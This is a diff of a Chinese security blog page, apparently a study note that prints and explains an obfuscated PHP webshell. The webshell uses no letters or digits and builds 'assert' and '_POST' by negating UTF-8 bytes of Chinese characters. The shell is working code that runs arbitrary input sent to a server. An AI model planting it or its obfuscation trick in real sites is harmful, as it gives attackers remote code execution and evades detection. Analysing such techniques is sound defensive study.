@@ -8,17 +8,21 @@
 
 <title>
   
-    标签: 网络安全
+    一些不包含数字和字母的webshell理解
   
 </title>
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="魂淡的随笔录">
-<meta property="og:url" content="https:&#x2F;&#x2F;soul-hd.github.io&#x2F;tags&#x2F;%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;index.html">
+<meta name="description" content="一些不包含数字和字母的webshell理解前言前端时间群里大佬发了一个代码询问我们里面的原理，代码如下：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一些不包含数字和字母的webshell理解">
+<meta property="og:url" content="https:&#x2F;&#x2F;soul-hd.github.io&#x2F;2020&#x2F;01&#x2F;20&#x2F;%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell&#x2F;index.html">
 <meta property="og:site_name" content="魂淡的随笔录">
+<meta property="og:description" content="一些不包含数字和字母的webshell理解前言前端时间群里大佬发了一个代码询问我们里面的原理，代码如下：">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-01-20T00:00:00.000Z">
+<meta property="article:modified_time" content="2020-01-20T06:02:29.518Z">
 <meta property="article:author" content="魂淡">
-<meta property="article:tag" content="魂淡">
+<meta property="article:tag" content="网络安全">
 <meta name="twitter:card" content="summary">
 
 
@@ -139,105 +143,84 @@
       
         <div style="max-width: 1000px">
       
-          <h1>网络安全</h1>
-
-
+          <article id="post-一些不包含数字和字母的webshell" class="article article-type-post">
+  
+    <h1 class="article-header">
+      一些不包含数字和字母的webshell理解
+    </h1>
   
   
-    <div class="post-list">
-  
 
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2020/01/20/%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/" >
-  一些不包含数字和字母的webshell理解
-</a>
-
-      </h3>
-      
-
-      <div class="article-info">
-        <a href="/2020/01/20/%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"><span class="article-date">
+  <div class="article-info">
+    <span class="article-date">
   2020-01-20
 </span>
-</a>
-        
+
+    
 	<span class="article-category tagcloud">
 	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
 	</span>
 
 
-        
+    
 	<span class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
 	</span>
 
 
-      </div>
-      <div class="article-entry">
-        
-          <h1 id="一些不包含数字和字母的webshell理解"><a href="#一些不包含数字和字母的webshell理解" class="headerlink" title="一些不包含数字和字母的webshell理解"></a>一些不包含数字和字母的webshell理解</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前端时间群里大佬发了一个代码询问我们里面的原理，代码如下：</p>
-          <p>
-            <a href="/2020/01/20/%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/">
-              阅读全文
-            </a>
-          </p>
-        
-      </div>
-    </div>
+  </div>
+  <div class="article-entry">
+    <h1 id="一些不包含数字和字母的webshell理解"><a href="#一些不包含数字和字母的webshell理解" class="headerlink" title="一些不包含数字和字母的webshell理解"></a>一些不包含数字和字母的webshell理解</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前端时间群里大佬发了一个代码询问我们里面的原理，代码如下：</p>
+<a id="more"></a>
 
-  
-    </div>
-  
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__ = (<span class="string">'&gt;'</span> &gt; <span class="string">'&lt;'</span>) + (<span class="string">'&gt;'</span> &gt; <span class="string">'&lt;'</span>);</span><br><span class="line">$_ = $__ / $__;</span><br><span class="line"></span><br><span class="line">$____ = <span class="string">''</span>;</span><br><span class="line">$___ = <span class="string">"瞰"</span>;</span><br><span class="line">$____ .= ~($___&#123;$_&#125;);</span><br><span class="line">$___ = <span class="string">"和"</span>;<span class="comment">//(3) he</span></span><br><span class="line">$____ .= ~($___&#123;$__&#125;);</span><br><span class="line">$___ = <span class="string">"和"</span>;</span><br><span class="line">$____ .= ~($___&#123;$__&#125;);</span><br><span class="line">$___ = <span class="string">"的"</span>;</span><br><span class="line">$____ .= ~($___&#123;$_&#125;);</span><br><span class="line">$___ = <span class="string">"半"</span>;</span><br><span class="line">$____ .= ~($___&#123;$_&#125;); </span><br><span class="line">$___ = <span class="string">"始"</span>;</span><br><span class="line">$____ .= ~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_____ = <span class="string">'_'</span>;</span><br><span class="line">$___ = <span class="string">"俯"</span>;</span><br><span class="line">$_____ .= ~($___&#123;$__&#125;);</span><br><span class="line">$___ = <span class="string">"瞰"</span>;</span><br><span class="line">$_____ .= ~($___&#123;$__&#125;);</span><br><span class="line">$___ = <span class="string">"次"</span>;</span><br><span class="line">$_____ .= ~($___&#123;$_&#125;);</span><br><span class="line">$___ = <span class="string">"站"</span>;</span><br><span class="line">$_____ .= ~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_ = $$_____;</span><br><span class="line">$____($_[$__]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-  
-  
-    <div class="post-list">
-  
+<p>后来在诸位大佬的帮助下找到了这篇文章，顿时眼界打开。</p>
+<p>[]: <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list</a></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="源码理解"><a href="#源码理解" class="headerlink" title="源码理解"></a>源码理解</h3><p>第一行的$__ = (‘&gt;’ &gt; ‘&lt;’) + (‘&gt;’ &gt; ‘&lt;’);实际上是ture+ture也就是1+1</p>
+<p>所以$__=2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$___ &#x3D; &quot;瞰&quot;;</span><br><span class="line">$____ .&#x3D; ~($___&#123;$_&#125;);</span><br></pre></td></tr></table></figure>
 
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2020/01/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80waf%E8%BD%AF%E4%BB%B6/" >
-  PHP反序列化免杀waf软件
-</a>
+<p>这两行代码的原理是这样的：</p>
+<p>将某个汉字转为utf-8编码，然后将其中某个字符取出来。</p>
+<p>{}这个括号可以理解为数组里面的[]</p>
+<p>~在php里是取反</p>
+<p>.这个符号则是添加，类似于python的append</p>
+<p>所以这两行代码实际上就是先转为utf-8编码，然后通过{}将里面的字符提取出来，再进行取反，然后就生成a这个字符了。</p>
+<p>而这个加密的关键就是在于utf-8编码这里。</p>
+<p>下面我们来说明一下相关的原理</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我们以“瞰”这个汉字为例。</p>
+<p>首先我们这个字要在网络上传播是需要使用二进制来表示电压的。</p>
+<p>在unicode编码表中，“瞰”这个字的编码为0x77B0.</p>
+<p>转成utf-8模式，对照它的映射表，我们这个0x77B0是在0x000-0xFFFF之间，而utf-8是使用3字节模板（1110xxxx 10xxxxxx 10xxxxxx），所以我们需要将77B0转成二进制</p>
+<p>（0111 0111 1011 0000）</p>
+<p>在转成二进制后我们用这个比特流一次代替模板中的x，得到</p>
+<p>11100111 10011110 10110000即为e7，9e，b0</p>
+<p>在源码中我们‘瞰’这个字是提取第一组字符出来进行取反的，因此我们是提取了10011110出来，然后取反为01100001，根据ascill查询可以得到该二进制就是a</p>
 
-      </h3>
+  </div>
+  <footer class="article-footer">
+    
+  <div class="cc">
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.z" target="_blank" title="署名-相同方式共享">
+      <img src="/images/cc/cc.png">
       
-
-      <div class="article-info">
-        <a href="/2020/01/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80waf%E8%BD%AF%E4%BB%B6/"><span class="article-date">
-  2020-01-16
-</span>
-</a>
+          <img src="/images/cc/by.png">
         
-	<span class="article-category tagcloud">
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
-	</span>
+          <img src="/images/cc/sa.png">
+      
+      <span>
+        本作品采用知识共享 署名-相同方式共享 4.0 国际许可协议进行许可。
+      </span>
+    </a>
+  </div>
 
 
-        
-	<span class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
-	</span>
+    
 
+  </footer>
+</article>
 
-      </div>
-      <div class="article-entry">
-        
-          <h1 id="PHP反序列化免杀waf软件"><a href="#PHP反序列化免杀waf软件" class="headerlink" title="PHP反序列化免杀waf软件"></a>PHP反序列化免杀waf软件</h1><h2 id="一些需要的基础、理论知识"><a href="#一些需要的基础、理论知识" class="headerlink" title="一些需要的基础、理论知识"></a>一些需要的基础、理论知识</h2><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>序列化：把复杂的数据类型压缩到一个字符串中。这里面的数据类型可以是数组、字符串、对象等，</p>
-<p>函数：serialize（）</p>
-          <p>
-            <a href="/2020/01/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80waf%E8%BD%AF%E4%BB%B6/">
-              阅读全文
-            </a>
-          </p>
-        
-      </div>
-    </div>
-
-  
-    </div>
-  
 
 
 
